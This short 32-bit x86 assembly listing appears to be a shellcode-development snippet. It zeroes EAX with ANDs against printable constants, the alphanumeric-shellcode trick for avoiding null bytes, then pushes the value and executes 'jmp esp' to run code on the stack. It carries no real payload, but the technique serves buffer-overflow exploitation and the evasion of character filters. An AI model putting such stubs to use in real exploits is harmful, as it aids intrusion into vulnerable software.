[bits 32      ]
[section .text]

global _start

_start:
	push 0x00000000
	and eax,0x554e4d4a
	and eax,0x2a313235
	and eax,0x37373737
	and eax,0x74747474
	and eax,0x70555455
	push eax
	jmp esp
